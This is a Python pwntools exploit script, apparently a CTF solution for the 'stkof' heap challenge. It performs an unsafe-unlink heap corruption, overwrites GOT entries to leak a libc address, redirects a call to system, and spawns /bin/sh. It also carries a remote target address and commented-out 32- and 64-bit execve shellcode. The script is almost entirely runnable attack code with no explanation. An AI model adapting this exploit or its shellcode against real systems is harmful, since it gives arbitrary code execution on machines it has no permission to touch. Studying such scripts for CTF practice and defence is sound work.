#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
local = 1
elf = ELF('./stkof')
if local:
    p = process('./stkof')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
#payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
#shellcode = asm(shellcraft.sh())
#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
# shellcode32 = '''
#     push 0x1010101
#     xor dword ptr [esp], 0x169722e
#     push 0x6e69622f
#     mov ebx, esp
#     xor ecx, ecx
#     xor edx, edx
#     push SYS_execve
#     pop eax
#     int 0x80'''
# shellcode64 = '''
#     mov rax, 0x101010101010101
#     push rax
#     mov rax, 0x101010101010101 ^ 0x68732f6e69622f
#     xor [rsp], rax
#     mov rdi, rsp
#     xor edx, edx 
#     xor esi, esi 
#     push SYS_execve 
#     pop rax
#     syscall'''
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
#addr = u64(rc(6).ljust(8,'\x00'))
#addr = u32(rc(4))
#addr = int(rc(6),16)#string
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def edit(index,size,Content):
    sl('2')
    sl(str(index))
    sl(str(size))
    sd(Content)
    ru('OK\n')
def free(Index):
    sl('3')
    sl(str(Index))
def malloc(size):
    sl('1')
    sl(str(size))
    ru('OK\n')

ptr = 0x602150
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_got = elf.got["puts"]
puts_plt = elf.symbols['puts']
malloc(0x80)#1
malloc(0x30)#2
# bk(0x400981)
malloc(0x80)#3
malloc(0x80)#4
FD = ptr - 0x18
BK = ptr - 0x10
py = ''
py += p64(0) + p64(0x31)
py += p64(FD) + p64(BK)
py += 'a'*16
py += p64(0x30) + p64(0x90)
edit(2,0x40,py)
bk(0)
free(3)
# bk(0)
py1 = ''
py1 += p64(0) + p64(atoi_got) + p64(puts_got) + p64(free_got)
edit(2,len(py1),py1)
py2 = ''
py2 += p64(puts_plt)
edit(2,len(py2),py2)
free(1)
puts_addr = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
print "puts_addr--->" + hex(puts_addr)
onegadget = puts_addr - libc.symbols["puts"] + 0xf02a4
print "onegadget--->" + hex(onegadget)
system = puts_addr - libc.symbols["puts"] + libc.symbols['system']
# edit(2,0x8,p64(onegadget))
# free(2)
edit(0,0x8,p64(system))
sl('/bin/sh\x00')

p.interactive()